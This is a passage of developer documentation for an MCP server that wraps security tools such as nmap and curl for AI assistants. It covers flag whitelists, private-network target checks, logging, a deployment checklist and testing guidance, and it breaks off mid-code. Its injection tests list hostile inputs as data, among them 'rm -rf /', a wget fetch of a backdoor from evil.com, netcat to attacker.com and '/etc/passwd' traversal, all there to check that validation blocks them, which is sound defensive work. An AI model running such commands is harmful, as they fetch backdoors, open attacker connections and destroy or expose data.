self.rate_limiter = RateLimiter(rate=20, per=60.0)  # 20 req/min
4. Validation Errors
Symptom: VALIDATION_ERROR in response.

Common Causes:

Invalid target:

text

# Bad:  8.8.8.8 (public IP)
# Good: 192.168.1.1 (RFC1918)
Forbidden characters:

text

# Bad:  extra_args="-p 80; rm -rf /"
# Good: extra_args="-p 80"
Non-whitelisted flags:

text

# Bad:  extra_args="--script-args=unsafe"
# Good: extra_args="--script=safe"
Debug: Check error_context.metadata in response for details.

Logging Patterns
Structured Logging Examples:

Python

# Success
log.info("tool.end command=%s returncode=%s", cmd[0], rc)

# Validation failure
log.warning("nmap.intrusive_script_blocked script=%s", script)

# Circuit breaker
log.info("circuit_breaker.state_changed tool=%s old=%s new=%s", 
         tool_name, old_state, new_state)

# Rate limiting
log.debug("rate_limiter.cleanup removed=%d", len(to_remove))
Correlation IDs:

Python

# Generate
correlation_id = inp.correlation_id or str(int(time.time() * 1000))

# Log
log.info("tool.start correlation_id=%s target=%s", correlation_id, target)

# Response
result.correlation_id = correlation_id
Trace Requests:

Bash

# Find all logs for a request
grep "correlation_id=1234567890" server.log
Security Checklist
Before deploying to production:

 Environment Variables Set

 MCP_SECURITY_ALLOW_INTRUSIVE=false (unless needed)
 MCP_MAX_MEMORY_MB=512 (or lower)
 MCP_DEFAULT_TIMEOUT_SEC=300 (reasonable)
 Network Restrictions

 Firewall rules limit access to HTTP port
 Only allow connections from trusted IPs
 Consider VPN/bastion host for access
 Rate Limiting

 Adjusted for expected load
 Monitors in place for 429 responses
 Resource Limits

 ulimit configured on host
 Container limits set (if using Docker)
 Logging

 Centralized log collection
 Alerts on ERROR/CRITICAL
 Correlation IDs tracked
 Monitoring

 Prometheus scraping /metrics
 Grafana dashboards for key metrics
 Alerts on circuit breaker OPEN
 Tool Audit

 Review allowed_flags for each tool
 Test injection scenarios
 Verify _is_private_or_lab logic
 Graceful Shutdown

 MCP_SERVER_SHUTDOWN_GRACE_PERIOD=30
 Health check wired to load balancer
 Kubernetes preStop hook configured (if K8s)
Conclusion
This MCP Server architecture provides a robust, secure, and extensible framework for exposing system tools to AI assistants. Key design principles:

Security through layers: Multiple validation stages prevent attacks
Resilience through patterns: Circuit breakers, retries, timeouts
Observability through instrumentation: Metrics, health, structured logs
Simplicity through convention: Tools auto-discovered, minimal boilerplate
Next Steps:

Read the Tool Development Guide for creating new tools
Review existing tools in mcp_server/tools/ as examples
Set up monitoring and alerts for production deployment
Document Version: 1.0
Last Updated: 2024
Maintainer: MCP Server Team
```
End of first document


---

```markdown
# MCP Server Tool Development Guide

## Table of Contents
1. [Quick Start](#quick-start)
2. [Tool Development Lifecycle](#tool-development-lifecycle)
3. [Tool Anatomy](#tool-anatomy)
4. [Step-by-Step Guide](#step-by-step-guide)
5. [Validation Patterns](#validation-patterns)
6. [Testing Guidelines](#testing-guidelines)
7. [Advanced Patterns](#advanced-patterns)
8. [Best Practices](#best-practices)
9. [Common Pitfalls](#common-pitfalls)
10. [Reference Templates](#reference-templates)

---

## Quick Start

### 5-Minute Tool Creation

**Goal**: Create a `curl` tool that fetches URLs from private networks.

```python
# File: mcp_server/tools/curl_tool.py

from mcp_server.base_tool import MCPBaseTool

class CurlTool(MCPBaseTool):
    """Fetch URLs from private networks using curl."""
    
    command_name = "curl"
    
    allowed_flags = [
        "-X", "--request",      # HTTP method
        "-H", "--header",       # Headers
        "-d", "--data",         # POST data
        "-L", "--location",     # Follow redirects
        "-k", "--insecure",     # Allow insecure SSL
        "-s", "--silent",       # Silent mode
        "-o", "--output",       # Output file
        "--connect-timeout",    # Connection timeout
        "--max-time",           # Maximum time
    ]
    
    default_timeout_sec = 30.0
    concurrency = 5

# That's it! Tool is automatically discovered and integrated.
Test It:

Bash

# Start server
python -m mcp_server.server

# In another terminal (HTTP mode)
curl -X POST http://localhost:8080/tools/CurlTool/execute \
  -H "Content-Type: application/json" \
  -d '{
    "target": "http://192.168.1.1/api",
    "extra_args": "-X GET -H \"Accept: application/json\""
  }'
Result:

JSON

{
  "stdout": "{\"status\": \"ok\"}",
  "stderr": "",
  "returncode": 0,
  "truncated_stdout": false,
  "truncated_stderr": false,
  "timed_out": false,
  "execution_time": 0.234
}
Tool Development Lifecycle
Phases
text

1. Design
   ├─ Identify command to wrap
   ├─ Define allowed flags (security)
   ├─ Determine resource requirements
   └─ Plan validation logic

2. Implement
   ├─ Create tool class
   ├─ Define class attributes
   ├─ Override methods (if needed)
   └─ Add custom validation

3. Test
   ├─ Unit tests (validation logic)
   ├─ Integration tests (actual execution)
   ├─ Security tests (injection attempts)
   └─ Load tests (concurrency)

4. Deploy
   ├─ Add to tools package
   ├─ Update documentation
   ├─ Configure monitoring
   └─ Review in production
Tool Anatomy
Class Structure
Python

from mcp_server.base_tool import MCPBaseTool, ToolInput, ToolOutput, ToolErrorType, ErrorContext
from typing import Optional, Sequence, Dict, Any

class MyTool(MCPBaseTool):
    """
    One-line description.
    
    Longer description with usage examples.
    """
    
    # ========================================
    # REQUIRED ATTRIBUTES
    # ========================================
    
    command_name: str = "mytool"
    """Name of the command to execute (must be in PATH)."""
    
    # ========================================
    # OPTIONAL ATTRIBUTES
    # ========================================
    
    allowed_flags: Optional[Sequence[str]] = [
        "-flag1", "-flag2", "--long-flag"
    ]
    """Whitelist of allowed flags. If None, all flags allowed (INSECURE)."""
    
    default_timeout_sec: float = 300.0
    """Default execution timeout in seconds."""
    
    concurrency: int = 2
    """Maximum concurrent executions."""
    
    circuit_breaker_failure_threshold: int = 5
    """Failures before circuit breaker opens."""
    
    circuit_breaker_recovery_timeout: float = 60.0
    """Seconds to wait before attempting recovery."""
    
    circuit_breaker_expected_exception: tuple = (Exception,)
    """Exceptions that trigger circuit breaker."""
    
    # ========================================
    # OPTIONAL CLASS VARIABLES
    # ========================================
    
    _FLAGS_REQUIRE_VALUE: set = {"-flag1", "--long-flag"}
    """Flags that require a value."""
    
    _EXTRA_ALLOWED_TOKENS: set = {"token1", "token2"}
    """Extra tokens allowed in validation."""
    
    # ========================================
    # OPTIONAL METHODS (Override if needed)
    # ========================================
    
    async def _execute_tool(self, inp: ToolInput, timeout_sec: Optional[float] = None) -> ToolOutput:
        """
        Override for custom validation or pre/post-processing.
        
        Args:
            inp: Validated tool input
            timeout_sec: Optional timeout override
        
        Returns:
            ToolOutput with execution results
        """
        # Custom validation
        if not self._custom_validate(inp):
            error_context = ErrorContext(
                error_type=ToolErrorType.VALIDATION_ERROR,
                message="Custom validation failed",
                recovery_suggestion="Fix the input",
                timestamp=datetime.now(),
                tool_name=self.tool_name,
                target=inp.target
            )
            return self._create_error_output(error_context, inp.correlation_id or "")
        
        # Call parent implementation
        result = await super()._execute_tool(inp, timeout_sec)
        
        # Post-process result
        result.metadata['custom_field'] = 'value'
        
        return result
    
    def _custom_validate(self, inp: ToolInput) -> bool:
        """Custom validation logic."""
        return True
    
    def get_tool_info(self) -> Dict[str, Any]:
        """
        Override to add tool-specific information.
        
        Returns:
            Dictionary with tool metadata
        """
        info = super().get_tool_info()
        info['custom_metadata'] = {
            'version': '1.0.0',
            'capabilities': ['cap1', 'cap2']
        }
        return info
Step-by-Step Guide
Step 1: Create Tool File
Location: mcp_server/tools/your_tool.py

Naming Convention:

File: {command}_tool.py (e.g., nmap_tool.py)
Class: {Command}Tool (e.g., NmapTool)
Template:

Python

"""
Tool description.

Features:
- Feature 1
- Feature 2

Usage:
    tool = MyTool()
    result = await tool.run(ToolInput(target="192.168.1.1"))
"""
import logging
from typing import Optional, Sequence
from mcp_server.base_tool import MCPBaseTool, ToolInput, ToolOutput

log = logging.getLogger(__name__)

class MyTool(MCPBaseTool):
    """One-line description for Claude."""
    
    command_name = "mytool"
    allowed_flags = ["-flag"]
    default_timeout_sec = 60.0
    concurrency = 5
Step 2: Define Allowed Flags
Critical: This is your primary security control.

Process:

Read tool's man page: man mytool
Identify safe, read-only flags
Exclude dangerous flags:
File write operations (-o, --output)
Execution flags (-e, --exec)
Privilege escalation (--sudo, --user)
Network exposure (--listen, --serve)
Example (from nmap_tool.py, Lines 74-105):

Python

BASE_ALLOWED_FLAGS: Tuple[str, ...] = (
    # Scan types (safe, read-only)
    "-sS", "-sT", "-sU", "-sn", "-sV", "-sC",
    
    # Port specifications (validated separately)
    "-p", "--top-ports",
    
    # Timing (performance)
    "-T", "-T0", "-T1", "-T2", "-T3", "-T4", "-T5",
    
    # Host discovery
    "-Pn", "-PS", "-PA",
    
    # Output formats (controlled)
    "-oX", "-oN", "-oG",
    
    # ❌ EXCLUDED (dangerous):
    # "-iL" (read file input)
    # "--script-args" (arbitrary script args)
    # "-d" (debugging, verbose)
)
Flags That Require Values:

Python

_FLAGS_REQUIRE_VALUE = {
    "-p",           # Port specification
    "--top-ports",  # Number of ports
    "-T",           # Timing template
    "--max-rate",   # Rate limit
}
Why This Matters:

Python

# Without _FLAGS_REQUIRE_VALUE:
# Input: "-p"
# Parsed: ["-p", "192.168.1.1"]  # Target consumed as value!
# Result: Wrong target, scan fails

# With _FLAGS_REQUIRE_VALUE:
# Input: "-p"
# Validation: ValueError("-p requires a value")
# Result: Safe rejection
Step 3: Set Resource Limits
Consider:

Command duration: How long does it typically run?
Concurrent usage: Can multiple run safely?
Resource usage: CPU/memory intensive?
Examples:

Fast Command (ping):

Python

class PingTool(MCPBaseTool):
    command_name = "ping"
    default_timeout_sec = 30.0   # Ping completes quickly
    concurrency = 10              # Many can run concurrently
Medium Command (curl):

Python

class CurlTool(MCPBaseTool):
    command_name = "curl"
    default_timeout_sec = 60.0   # Network requests vary
    concurrency = 5              # Moderate concurrency
Slow Command (nmap):

Python

class NmapTool(MCPBaseTool):
    command_name = "nmap"
    default_timeout_sec = 600.0  # Scans can take minutes
    concurrency = 1              # Only one at a time (resource intensive)
Extreme Case (password cracker):

Python

class HashcatTool(MCPBaseTool):
    command_name = "hashcat"
    default_timeout_sec = 3600.0  # Hours-long operations
    concurrency = 1               # Exclusive GPU access
    circuit_breaker_failure_threshold = 3  # Strict (expensive failures)
Step 4: Implement Custom Validation (If Needed)
When to Override _execute_tool:

Tool-specific target validation
Argument pre-processing
Result post-processing
Pattern (from nmap_tool.py, Lines 221-276):

Python

async def _execute_tool(self, inp: ToolInput, timeout_sec: Optional[float] = None) -> ToolOutput:
    """Execute with custom validation."""
    
    # 1. Custom validation
    validation_result = self._validate_nmap_requirements(inp)
    if validation_result:
        return validation_result  # Return error output
    
    # 2. Parse and validate arguments
    try:
        parsed_args = self._parse_and_validate_args(inp.extra_args or "")
    except ValueError as e:
        error_context = ErrorContext(
            error_type=ToolErrorType.VALIDATION_ERROR,
            message=f"Invalid arguments: {str(e)}",
            recovery_suggestion="Check argument syntax",
            timestamp=datetime.now(),
            tool_name=self.tool_name,
            target=inp.target,
            metadata={"error": str(e)}
        )
        return self._create_error_output(error_context, inp.correlation_id or "")
    
    # 3. Optimize/transform arguments
    optimized_args = self._optimize_nmap_args(parsed_args)
    
    # 4. Create enhanced input
    enhanced_input = ToolInput(
        target=inp.target,
        extra_args=optimized_args,
        timeout_sec=timeout_sec or inp.timeout_sec,
        correlation_id=inp.correlation_id,
    )
    
    # 5. Call parent implementation
    result = await super()._execute_tool(enhanced_input, enhanced_input.timeout_sec)
    
    # 6. Post-process result (optional)
    result.metadata['optimizations_applied'] = True
    
    return result
Custom Validation Example (nmap_tool.py, Lines 277-359):

Python

def _validate_nmap_requirements(self, inp: ToolInput) -> Optional[ToolOutput]:
    """Validate nmap-specific requirements."""
    target = inp.target.strip()
    
    # Validate network size
    if "/" in target:
        network = ipaddress.ip_network(target, strict=False)
        
        if network.num_addresses > self.MAX_NETWORK_SIZE:
            max_cidr = self._get_max_cidr_for_size(self.MAX_NETWORK_SIZE)
            error_context = ErrorContext(
                error_type=ToolErrorType.VALIDATION_ERROR,
                message=f"Network too large: {network.num_addresses} hosts (max: {self.MAX_NETWORK_SIZE})",
                recovery_suggestion=f"Use /{max_cidr} or smaller",
                timestamp=datetime.now(),
                tool_name=self.tool_name,
                target=target,
                metadata={
                    "network_size": network.num_addresses,
                    "max_allowed": self.MAX_NETWORK_SIZE,
                    "suggested_cidr": f"/{max_cidr}"
                }
            )
            return self._create_error_output(error_context, inp.correlation_id or "")
    
    return None  # Validation passed
Step 5: Add Tool-Specific Utilities
Common Patterns:

1. Result Parsing (nmap_tool.py, Lines 731-770):

Python

def parse_scan_result(self, output: str) -> ScanResult:
    """Parse tool output into structured data."""
    result = ScanResult(raw_output=output)
    
    # Parse hosts up
    hosts_match = self._HOSTS_UP_PATTERN.search(output)
    if hosts_match:
        result.hosts_up = int(hosts_match.group(1))
    
    # Parse ports
    for line in output.split('\n'):
        port_match = self._PORT_PATTERN.match(line.strip())
        if port_match:
            port_num, protocol, state, service = port_match.groups()
            result.ports_found.append({
                "port": int(port_num),
                "protocol": protocol,
                "state": state,
                "service": service.strip()
            })
    
    return result
2. Templates (nmap_tool.py, Lines 107-113, 233-256):

Python

class ScanTemplate(Enum):
    """Predefined scan templates."""
    QUICK = "quick"
    STANDARD = "standard"
    THOROUGH = "thorough"

async def run_with_template(self, target: str, template: ScanTemplate) -> ToolOutput:
    """Run with predefined template."""
    args = self._get_template_args(template)
    inp = ToolInput(target=target, extra_args=args)
    return await self.run(inp)

def _get_template_args(self, template: ScanTemplate) -> str:
    """Map template to arguments."""
    templates = {
        ScanTemplate.QUICK: "-T4 --top-ports 100",
        ScanTemplate.STANDARD: "-T4 --top-ports 1000 -sV",
        ScanTemplate.THOROUGH: "-p- -sV -sC",
    }
    return templates[template]
3. Caching (nmap_tool.py, Lines 497-553):

Python

class MyTool(MCPBaseTool):
    def __init__(self):
        super().__init__()
        self._validation_cache: Dict[str, bool] = {}
    
    def _validate_expensive_check(self, value: str) -> bool:
        """Cache expensive validation results."""
        if value in self._validation_cache:
            return self._validation_cache[value]
        
        result = expensive_check(value)
        self._validation_cache[value] = result
        return result
    
    def clear_caches(self):
        """Clear cache (useful for testing/config changes)."""
        self._validation_cache.clear()
Step 6: Implement get_tool_info (Optional)
Purpose: Provide comprehensive tool metadata for introspection.

Pattern (nmap_tool.py, Lines 782-875):

Python

def get_tool_info(self) -> Dict[str, Any]:
    """Get comprehensive tool information."""
    return {
        "name": self.tool_name,
        "command": self.command_name,
        "version": "1.0",
        "description": self.__doc__,
        
        "performance": {
            "concurrency": self.concurrency,
            "default_timeout": self.default_timeout_sec,
        },
        
        "allowed_operations": {
            "flags_count": len(self.allowed_flags),
            "flags": list(self.allowed_flags),
        },
        
        "safety_limits": {
            "max_arg_length": 2048,
            "max_output": 1048576,
        },
        
        "circuit_breaker": {
            "enabled": self._circuit_breaker is not None,
            "failure_threshold": self.circuit_breaker_failure_threshold,
            "state": self._circuit_breaker.state.name if self._circuit_breaker else "N/A",
        },
        
        "metrics": {
            "available": self.metrics is not None,
        },
        
        "security_features": [
            "Whitelist-based flag validation",
            "Network size limits",
            "Output truncation",
        ]
    }
Usage:

Python

tool = MyTool()
info = tool.get_tool_info()
print(json.dumps(info, indent=2))
Validation Patterns
Pattern 1: Regex Validation
Use Case: Port specifications, IP ranges, numeric values

Implementation:

Python

import re

class MyTool(MCPBaseTool):
    # Pre-compile for performance
    _PORT_PATTERN = re.compile(r'^[\d,\-]+$')
    _IP_PATTERN = re.compile(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$')
    
    def _validate_port_spec(self, port_spec: str) -> bool:
        """Validate port specification."""
        if not self._PORT_PATTERN.match(port_spec):
            return False
        
        # Additional validation
        for range_spec in port_spec.split(','):
            if '-' in range_spec:
                start, end = range_spec.split('-')
                if not (1 <= int(start) <= 65535 and 1 <= int(end) <= 65535):
                    return False
        
        return True
Pattern 2: Library Validation
Use Case: IP addresses, networks, URLs

Implementation:

Python

import ipaddress
from urllib.parse import urlparse

class MyTool(MCPBaseTool):
    def _validate_network(self, target: str) -> bool:
        """Validate network using ipaddress library."""
        try:
            net = ipaddress.ip_network(target, strict=False)
            
            # Check privacy
            if not net.is_private:
                return False
            
            # Check size
            if net.num_addresses > 1024:
                return False
            
            return True
        except ValueError:
            return False
    
    def _validate_url(self, url: str) -> bool:
        """Validate URL structure."""
        try:
            parsed = urlparse(url)
            
            # Must have scheme and netloc
            if not parsed.scheme or not parsed.netloc:
                return False
            
            # Must be http/https
            if parsed.scheme not in ('http', 'https'):
                return False
            
            # Validate host is private
            host = parsed.hostname
            if host:
                ip = ipaddress.ip_address(host)
                if not ip.is_private:
                    return False
            
            return True
        except Exception:
            return False
Pattern 3: Range Validation
Use Case: Numeric parameters with bounds

Implementation:

Python

class MyTool(MCPBaseTool):
    _FLAGS_REQUIRE_VALUE = {"--intensity", "--rate", "--timeout"}
    
    def _validate_flag_value(self, flag: str, value: str) -> bool:
        """Validate flag values with range checks."""
        if flag == "--intensity":
            try:
                val = int(value)
                return 0 <= val <= 9
            except ValueError:
                return False
        
        if flag == "--rate":
            try:
                val = int(value)
                return 1 <= val <= 10000
            except ValueError:
                return False
        
        if flag == "--timeout":
            try:
                val = float(value)
                return 1.0 <= val <= 3600.0
            except ValueError:
                return False
        
        return True
Pattern 4: Policy-Based Validation
Use Case: Features gated by configuration

Implementation (from nmap_tool.py, Lines 169-218):

Python

class MyTool(MCPBaseTool):
    def __init__(self):
        super().__init__()
        self.config = get_config()
        self.allow_intrusive = False
        self._apply_config()
    
    def _apply_config(self):
        """Apply configuration with policy enforcement."""
        if hasattr(self.config, 'security'):
            sec = self.config.security
            if hasattr(sec, 'allow_intrusive'):
                self.allow_intrusive = bool(sec.allow_intrusive)
    
    @property
    def allowed_flags(self) -> List[str]:
        """Dynamic flag list based on policy."""
        flags = list(self.BASE_ALLOWED_FLAGS)
        
        if self.allow_intrusive:
            flags.extend(["-A", "--script=vuln"])
        
        return flags
    
    def _validate_script(self, script_name: str) -> bool:
        """Validate script based on policy."""
        if script_name in self.SAFE_SCRIPTS:
            return True
        
        if script_name in self.INTRUSIVE_SCRIPTS:
            return self.allow_intrusive
        
        return False  # Unknown scripts blocked
Pattern 5: Whitelist Validation
Use Case: Enum-like values (scan types, methods, etc.)

Implementation:

Python

class MyTool(MCPBaseTool):
    ALLOWED_METHODS = {"GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS"}
    ALLOWED_CONTENT_TYPES = {
        "application/json",
        "application/xml",
        "text/plain",
        "text/html"
    }
    
    def _validate_method(self, method: str) -> bool:
        """Validate HTTP method against whitelist."""
        return method.upper() in self.ALLOWED_METHODS
    
    def _validate_content_type(self, content_type: str) -> bool:
        """Validate content type against whitelist."""
        # Extract base type (ignore charset, etc.)
        base_type = content_type.split(';')[0].strip()
        return base_type.lower() in self.ALLOWED_CONTENT_TYPES
Testing Guidelines
Unit Tests
Test Structure:

Python

# tests/test_mytool.py

import pytest
from mcp_server.tools.mytool import MyTool
from mcp_server.base_tool import ToolInput

class TestMyTool:
    @pytest.fixture
    def tool(self):
        """Create tool instance."""
        return MyTool()
    
    def test_command_name(self, tool):
        """Verify command name."""
        assert tool.command_name == "mytool"
    
    def test_allowed_flags(self, tool):
        """Verify allowed flags."""
        assert "-safe-flag" in tool.allowed_flags
        assert "-dangerous-flag" not in tool.allowed_flags
    
    @pytest.mark.parametrize("target,expected", [
        ("192.168.1.1", True),          # Valid private IP
        ("10.0.0.1", True),             # Valid private IP
        ("8.8.8.8", False),             # Public IP (invalid)
        ("server.lab.internal", True),   # Valid hostname
        ("google.com", False),          # Public hostname (invalid)
    ])
    def test_target_validation(self, tool, target, expected):
        """Test target validation."""
        try:
            inp = ToolInput(target=target)
            assert expected == True
        except ValueError:
            assert expected == False
    
    @pytest.mark.parametrize("args,should_pass", [
        ("-safe-flag", True),
        ("-safe-flag value", True),
        ("-dangerous-flag", False),
        ("-safe-flag ; rm -rf /", False),  # Injection attempt
        ("-safe-flag `whoami`", False),    # Command substitution
    ])
    def test_argument_validation(self, tool, args, should_pass):
        """Test argument validation."""
        try:
            validated = tool._parse_args(args)
            assert should_pass == True
        except ValueError:
            assert should_pass == False
Integration Tests
Test Structure:

Python

import pytest

class TestMyToolIntegration:
    @pytest.mark.asyncio
    async def test_successful_execution(self, tool):
        """Test successful tool execution."""
        inp = ToolInput(
            target="192.168.1.1",
            extra_args="-safe-flag"
        )
        result = await tool.run(inp)
        
        assert result.returncode == 0
        assert not result.timed_out
        assert result.error is None
        assert len(result.stdout) > 0
    
    @pytest.mark.asyncio
    async def test_timeout_handling(self, tool):
        """Test timeout enforcement."""
        inp = ToolInput(
            target="192.168.1.1",
            timeout_sec=0.1  # Very short timeout
        )
        result = await tool.run(inp)
        
        assert result.timed_out == True
        assert result.returncode == 124
    
    @pytest.mark.asyncio
    async def test_invalid_target_rejection(self, tool):
        """Test invalid target rejection."""
        inp = ToolInput(target="8.8.8.8")  # Public IP
        result = await tool.run(inp)
        
        assert result.error is not None
        assert result.error_type == "validation_error"
    
    @pytest.mark.asyncio
    async def test_concurrency_limit(self, tool):
        """Test concurrency enforcement."""
        # Start max concurrent executions
        tasks = []
        for i in range(tool.concurrency + 2):
            inp = ToolInput(target=f"192.168.1.{i+1}")
            tasks.append(tool.run(inp))
        
        # Should handle gracefully without errors
        results = await asyncio.gather(*tasks)
        assert all(r is not None for r in results)
Security Tests
Injection Prevention Tests:

Python

class TestMyToolSecurity:
    @pytest.mark.parametrize("malicious_input", [
        # Command injection attempts
        "; rm -rf /",
        "& wget evil.com/backdoor",
        "| nc attacker.com 1234",
        "`whoami`",
        "$(curl evil.com)",
        
        # Path traversal
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        
        # Null bytes
        "\x00",
        "valid\x00malicious",
        
        # Shell metacharacters
        "$VAR",
        "${SHELL}",
        "\\n",
        "\\r",
    ])
    @pytest.mark.asyncio
    async def test_injection_prevention(self, tool, malicious_input):
        """Test that injection attempts are blocked."""
        try:
            # Should fail validation
            inp = ToolInput(
                target="192.168.1.1",
                extra_args=malicious_input
            )
            result = await tool.run(inp)
            
            # If it somehow passes, should have error
            assert result.error is not None
        except ValueError:
            # Expected: validation should raise ValueError
            pass
    
    @pytest.mark.asyncio
    async def test_resource_limits_enforced(self, tool):
        """Test that resource limits prevent abuse."""
        # Attempt to consume excessive resources
        inp = ToolInput(
            target="192.168.1.0/16",  # Very large network
        )
        result = await tool.run(inp)
        
        # Should be rejected or limited
        assert result.error is not None or result.timed_out
Load Tests
Concurrent Execution Test:

Python

@pytest.mark.asyncio
@pytest.mark.slow
async def test_concurrent_load(tool):
    """Test behavior under load."""
    num_requests = 100
    
    async def make_request(i):
        inp = ToolInput(target=f"192.168.1.{i % 254 + 1}")
        return await tool.run(inp)
    
    start = time.time()
    results = await asyncio.gather(*[make_request(i) for i in range(num_requests)])
    duration = time.time() - start
    
    # Verify results
    assert len(results) == num_requests
    assert all(r is not None for r in results)
    
    # Check performance (adjust based on tool)
    avg_time = duration / num_requests
    assert avg_time < 5.0  # Should average < 5s per request
Advanced Patterns
Pattern 1: Multi-Stage Validation
Use Case: Complex validation requiring multiple steps

Implementation:

Python

class MyTool(MCPBaseTool):
    async def _execute_tool(self, inp: ToolInput, timeout_sec: Optional[float] = None) -> ToolOutput:
        """Execute with multi-stage validation."""
        
        # Stage 1: Syntax validation
        syntax_error = self._validate_syntax(inp)
        if syntax_error:
            return syntax_error
        
        # Stage 2: Semantic validation
        semantic_error = await self._validate_semantics(inp)
        if semantic_error:
            return semantic_error
        
        # Stage 3: Permission validation
        permission_error = await self._validate_permissions(inp)
        if permission_error:
            return permission_error
        
        # All validations passed
        return await super()._execute_tool(inp, timeout_sec)
    
    def _validate_syntax(self, inp: ToolInput) -> Optional[ToolOutput]:
        """Stage 1: Check syntax."""
        try:
            parsed = self._parse_args(inp.extra_args)
            return None  # Valid
        except ValueError as e:
            return self._create_error_output(
                ErrorContext(
                    error_type=ToolErrorType.VALIDATION_ERROR,
                    message=f"Syntax error: {e}",
                    recovery_suggestion="Check argument format",
                    timestamp=datetime.now(),
                    tool_name=self.tool_name,
                    target=inp.target
                ),
                inp.correlation_id or ""
            )
    
    async def _validate_semantics(self, inp: ToolInput) -> Optional[ToolOutput]:
        """Stage 2: Check semantic validity (may involve async operations)."""
        # Example: Check if target is reachable
        if await self._is_host_down(inp.target):
            return self._create_error_output(
                ErrorContext(
                    error_type=ToolErrorType.VALIDATION_ERROR,
                    message=f"Host unreachable: {inp.target}",
                    recovery_suggestion="Check network connectivity",
                    timestamp=datetime.now(),
                    tool_name=self.tool_name,
                    target=inp.target
                ),
                inp.correlation_id or ""
            )
        return None
    
    async def _validate_permissions(self, inp: ToolInput) -> Optional[ToolOutput]:
        """Stage 3: Check permissions."""
        # Example: Check if operation is allowed based on policy
        if not await self._check_policy(inp.target, inp.extra_args):
            return self._create_error_output(
                ErrorContext(
                    error_type=ToolErrorType.VALIDATION_ERROR,
                    message="Operation not permitted by policy",
                    recovery_suggestion="Request permission or adjust operation",
                    timestamp=datetime.now(),
                    tool_name=self.tool_name,
                    target=inp.target
                ),
                inp.correlation_id or ""
            )
        return None
Pattern 2: Result Transformation
Use Case: Convert raw output to structured format

Implementation:

Python

from dataclasses import dataclass
from typing import List

@dataclass
class ParsedResult:
    """Structured result."""
    raw_output: str
    parsed_data: Dict[str, Any]
    summary: str

class MyTool(MCPBaseTool):
    async def run(self, inp: ToolInput, timeout_sec: Optional[float] = None) -> ToolOutput:
        """Execute and transform result."""
        # Execute
        result = await super().run(inp, timeout_sec)
        
        # Transform if successful
        if result.is_success():
            parsed = self._parse_output(result.stdout)
            result.metadata['parsed'] = parsed
            result.metadata['summary'] = self._generate_summary(parsed)
        
        return result
    
    def _parse_output(self, output: str) -> Dict[str, Any]:
        """Parse raw output into structured data."""
        parsed = {}
        
        # Example: Parse key-value pairs
        for line in output.split('\n'):
            if ':' in line:
                key, value = line.split(':', 1)
                parsed[key.strip()] = value.strip()
        
        return parsed
    
    def _generate_summary(self, parsed: Dict[str, Any]) -> str:
        """Generate human-readable summary."""
        return f"Found {len(parsed)} items"
Pattern 3: Progressive Enhancement
Use Case: Add features without breaking base functionality

Implementation:

Python

class MyTool(MCPBaseTool):
    """Tool with progressive enhancement."""
    
    def __init__(self):
        super().__init__()
        
        # Check for optional dependencies
        self.has_json_support = self._check_json_support()
        self.has_xml_support = self._check_xml_support()
        
        log.info("mytool.initialized json=%s xml=%s",
                self.has_json_support, self.has_xml_support)
    
    def _check_json_support(self) -> bool:
        """Check if JSON parsing available."""
        try:
            import json
            return True
        except ImportError:
            return False
    
    def _check_xml_support(self) -> bool:
        """Check if XML parsing available."""
        try:
            import xml.etree.ElementTree as ET
            return True
        except ImportError:
            return False
    
    async def run(self, inp: ToolInput, timeout_sec: Optional[float] = None) -> ToolOutput:
        """Execute with progressive enhancement."""
        result = await super().run(inp, timeout_sec)
        
        # Try JSON parsing if available
        if self.has_json_support and result.is_success():
            try:
                import json
                result.metadata['json'] = json.loads(result.stdout)
            except json.JSONDecodeError:
                pass  # Not JSON, skip
        
        # Try XML parsing if available
        if self.has_xml_support and result.is_success():
            try:
                import xml.etree.ElementTree as ET
                result.metadata['xml'] = ET.fromstring(result.stdout)
            except ET.ParseError:
                pass  # Not XML, skip
        
        return result
Pattern 4: Dry-Run Mode
Use Case: Validate without executing

Implementation:

Python

class MyTool(MCPBaseTool):
    """Tool with dry-run support."""
    
    async def validate_only(self, inp: ToolInput) -> ToolOutput:
        """Validate input without executing."""
        # Run all validation stages
        validation_result = self._validate_nmap_requirements(inp)
        if validation_result:
            return validation_result
        
        try:
            parsed_args = self._parse_and_validate_args(inp.extra_args or "")
        except ValueError as e:
            error_context = ErrorContext(
                error_type=ToolErrorType.VALIDATION_ERROR,
                message=f"Validation failed: {e}",
                recovery_suggestion="Fix arguments",
                timestamp=datetime.now(),
                tool_name=self.tool_name,
                target=inp.target
            )
            return self._create_error_output(error_context, inp.correlation_id or "")
        
        # Success: Return what would be executed
        cmd = f"{self.command_name} {parsed_args} {inp.target}"
        return ToolOutput(
            stdout=f"Would execute: {cmd}",
            stderr="",
            returncode=0,
            metadata={"dry_run": True, "command": cmd}
        )
Best Practices
1. Security First
Always:

✅ Use whitelist-based validation (not blacklist)
✅ Validate ALL user input
✅ Set allowed_flags explicitly
✅ Use _FLAGS_REQUIRE_VALUE for flags with arguments
✅ Sanitize output (truncation, encoding)
Never:

❌ Trust user input
❌ Use shell=True
❌ Execute arbitrary code
❌ Write to arbitrary files
❌ Expose sensitive data in errors
Example (INSECURE):

Python

# ❌ DON'T DO THIS
class BadTool(MCPBaseTool):
    command_name = "mytool"
    allowed_flags = None  # Allows ALL flags! Dangerous!
    
    async def run(self, inp: ToolInput) -> ToolOutput:
        # Directly concatenating user input into shell command
        cmd = f"{self.command_name} {inp.extra_args} {inp.target}"
        proc = subprocess.run(cmd, shell=True)  # Shell injection risk!
        return result
Example (SECURE):

Python

# ✅ DO THIS
class GoodTool(MCPBaseTool):
    command_name = "mytool"
    allowed_flags = ["-safe", "--read-only"]  # Explicit whitelist
    _FLAGS_REQUIRE_VALUE = {"--output-format"}
    
    # Use parent implementation (uses subprocess.exec, not shell)
    # Validation built-in
2. Error Handling
Provide Context:

Python

# ❌ Bad: Vague error
raise ValueError("Invalid input")

# ✅ Good: Detailed context
error_context = ErrorContext(
    error_type=ToolErrorType.VALIDATION_ERROR,
    message="Port specification invalid: '80-70' (start > end)",
    recovery_suggestion="Use format: start-end where start <= end (e.g., 80-443)",
    timestamp=datetime.now(),
    tool_name=self.tool_name,
    target=inp.target,
    metadata={
        "provided_value": "80-70",
        "expected_format": "start-end",
        "example": "80-443"
    }
)
return self._create_error_output(error_context, inp.correlation_id or "")
Recovery Suggestions:

Python

# Examples of helpful recovery suggestions
recovery_suggestions = {
